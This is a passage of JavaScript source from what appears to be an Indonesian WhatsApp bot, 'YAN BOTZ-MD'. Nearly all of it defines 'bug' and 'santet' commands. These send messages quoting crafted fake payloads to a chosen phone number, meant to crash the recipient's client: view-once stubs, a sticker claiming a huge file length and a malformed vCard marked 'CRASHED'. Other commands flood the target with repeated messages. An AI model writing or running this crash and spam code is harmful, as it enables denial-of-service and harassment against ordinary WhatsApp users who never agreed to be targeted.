let foncevid1 = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:foncevid1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:foncevid1})
buttonjo(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
break
case 'jobug8':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let fonceimg = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fonceimg})}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug8':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fonceimg = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fonceimg})
await repjo(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
break
case 'jogasbug8':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fonceimg1 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fonceimg1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fonceimg1})
buttonjo(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
break
case 'jobug9':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let fgc = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
 'jpegThumbnail': fs.readFileSync('./src/gambar/jo.jpg')}}}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fgc})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug9':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgc = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
 'jpegThumbnail': fs.readFileSync('./src/gambar/jo.jpg')}}}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fgc})
await repjo(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
break
case 'jogasbug9':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgc1 = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
 'jpegThumbnail': fs.readFileSync('./src/gambar/jo.jpg')}}}
 jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fgc1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fgc1})
buttonjo(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
break
case 'jobug10':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let stic = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./src/gambar/jo.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:stic})
 }
 buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
case 'josendbug10':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let stic = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./src/gambar/jo.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:stic})
 await repjo(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
 break
case 'jogasbug10':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let stic1 = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./src/gambar/jo.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:stic1})
 jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:stic1})
 buttonjo(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
 break
//Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
case 'jobug11':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let fkon = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./src/gambar/jo.jpg')}}}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fkon})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break 
case 'josendbug11':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fkon = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./src/gambar/jo.jpg')}}}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fkon})
await repjo(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
break 
case 'jogasbug11':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fkon1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./src/gambar/jo.jpg')}}}
 jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fkon1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:fkon1})
buttonjo(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
break 
case 'jobug12':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) { 
let finv = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]`, 
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:finv})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'josendbug12':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let finv = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]`, 
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:finv})
await repjo(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
break
case 'jogasbug12':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let finv1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]`, 
"caption": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
jobotz.sendMessage(m.chat, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:finv1})
jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 [CRASH]"},{quoted:finv1})
buttonjo(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
break
        case 'jothelima': {         
          if(!m.key.fromMe) return
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
            jobotz.sendMessage(m.chat, {text:"🇹 🇭 🇪 🇱 🇮 🇲 🇦"},{quoted:fgamjo})
            }
            buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
            }
            break
                case 'jobutto':
                    if (!isCreator && !isBan) return
                    if (!text) throw `Nomernya mana?`
                 buttonspc = [
                          {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: thejo}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
]
                      
                    buttonMessagepc = {
                          text: "JOMBLO",
                          footerText: 'JONES',
                          buttons: buttonspc,
                          headerType: 1
                      }
                      jobotz.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      repjo(`succes`)
                    break
           case 'josantetto': { 
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await repjo(`Berhasil Mengirim Santet Di Nomer ${text}`)
            }
            break
        case 'jogassantet': {          
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await repjo(`Berhasil Mengirim Santet Di Nomer ${text}`)
            }
            break
         case 'josantet':               
          if (!isCreator && !isBan) return
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            await jobotz.sendMessage(m.chat, {text:`SANTET\n${thejo}`},{quoted:fgamjo})
            await sleep(10000)
            buttonjo(`BERHASIL MENGIRIM SANTET`)
            break
 case 'joinfinite': 
 if (!isCreator && !isBan) return
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
